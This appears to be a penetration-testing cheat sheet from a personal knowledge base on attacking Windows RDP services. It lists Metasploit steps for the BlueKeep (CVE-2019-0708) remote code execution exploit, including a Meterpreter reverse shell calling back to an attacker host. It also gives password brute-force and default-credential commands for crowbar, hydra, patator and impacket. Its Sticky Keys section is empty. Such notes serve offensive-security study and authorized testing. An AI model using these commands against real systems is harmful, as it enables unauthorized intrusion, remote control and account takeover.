# RDP

## 01 - CVE

### 1.1 - BlueKeep RCE

TODO: Fill this info

```
msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show targets

msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set payload windows/x64/meterpreter/reverse_http

msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > options

msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set targets <target>

msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rdp_client_ip <fake_IP>

msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhosts <target_IP>

msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set lhost <attacker_IP>

msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set lport <attacker_PORT>

msf exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
```

## 02 - Sticky Keys Backdoor

```

```

## 03 - Default Credentials

Check some common and leaked credentials performing a password dictionary attack against and RDP service with impacket

```
$ rdp_check.py [<domain>/]<username>@<IP>
```

## 04 - Brute Force

> [!WARNING] Proceed with Caution!
> Sometimes RDP servers are configured with **Account Lockout Policy** so be careful what you're doing.

### 4.1 - Crowbar

```
$ crowbar -b rdp -s <IP> -u <username> -C passwords.lst -n 1

$ crowbar -b rdp -U users.lst -C passwords.lst -s <IP>/32
```

### 4.2 - Hydra

```
$ hydra -V -l <username> -p <password> rdp://<IP>/<domain>

$ hydra -V -l <username> -P passwords.txt <IP> rdp
```

### 4.3 - Patator

```
$ patator rdp_login host=<IP> user=<username> password=FILE0 0=passwords.lst -x ignore:fgrep='ERRCONNECT_LOGON_FAILURE'
```

### 4.4 - Impacket

```
$ rdp_check.py [<domain>/]"<username>":"<password>"@<IP>
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/A - Information Gathering/0x02 - Active Fingerprinting/Network Ports/Cross Platform/Remote Services/Graphical Remote Program/RDP|Active Fingerprinting: RDP]]

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x00 - Exploitation/0xF - Remote Services Exploitation/Network Ports/Remote Services/Graphical Remote Program/RDP/FreeRDP|Remote Services Exploitation: RDP]]

### Source Repositories

- [ztgrace: sticky_keys_hunter](https://github.com/ztgrace/sticky_keys_hunter)

- [linuz: Sticky Keys Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### Rapid7

- [Rapid7: Metasploit Framework - Bluekeep Exploit Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.md)

### Sploitify

- [Sploitify: Bluekeep CVE-2019-0708](https://sploitify.haxx.it/exploits/2019/CVE-2019-0708/)